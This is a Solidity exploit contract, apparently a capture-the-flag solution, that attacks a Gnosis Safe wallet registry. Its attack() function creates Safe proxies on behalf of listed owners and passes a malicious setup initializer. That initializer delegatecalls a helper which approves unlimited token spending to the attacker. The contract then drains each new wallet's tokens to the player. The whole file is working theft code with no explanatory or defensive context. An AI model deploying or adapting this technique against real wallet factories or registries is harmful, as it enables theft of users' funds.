// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ContractForApprove {
    function approveToken(address spender, address token) public {
        IERC20(token).approve(spender, type(uint256).max);
    }
}

contract BackdoorHack {

    bytes4 private constant SETUP_SELECTOR = bytes4(keccak256("setup(address[],uint256,address,bytes,address,address,uint256,address)"));

    address public player;
    address public singleton;
    address public walletFactoryAddress;
    IERC20 public token;
    IProxyCreationCallback private walletRegistry;
    ContractForApprove private contractForApprove;

    constructor(address _player, address _singleton, address _walletFactoryAddress, address _token, address _callback, address _approveContract) public {
        player = _player;
        singleton = _singleton;
        walletFactoryAddress = _walletFactoryAddress;
        token = IERC20(_token);
        walletRegistry = IProxyCreationCallback(_callback);
        contractForApprove = ContractForApprove(_approveContract);
    }

    function attack(address[] memory owners) external {
        // Call createProxyWithCallback to deploy a new GnosisSafeProxy on GnosisSafeProxyFactory
        // Create initializers for the GnosisSafeProxy
        // bytes memory approveData = abi.encodeWithSelector(ContractForApprove.approveToken.selector, address(this), address(token));
        bytes memory approveData = abi.encodeCall(ContractForApprove.approveToken, (address(this), address(token)));
        for (uint256 i = 0; i < owners.length; i++) {
            // bytes memory initializer = abi.encodeWithSelector(GnosisSafe.setup.selector, [owners[i]], 1, address(contractForApprove), approveData, address(0), address(0), 0, address(0));
            address[] memory users = new address[](1);
            users[0] = owners[i];
            bytes memory initializer = abi.encodeCall(GnosisSafe.setup, (users, 1, address(contractForApprove), approveData, address(0), address(0), 0, payable(address(0))));
            uint256 saltNonce = i; // Any random salt
            GnosisSafeProxy proxy = GnosisSafeProxyFactory(walletFactoryAddress).createProxyWithCallback(
                singleton,
                initializer,
                saltNonce,
                walletRegistry
            );
            // Transfer the funds to the player
            token.transferFrom(address(proxy), address(this), token.balanceOf(address(proxy)));
        }
        token.transfer(player, token.balanceOf(address(this)));
    }

}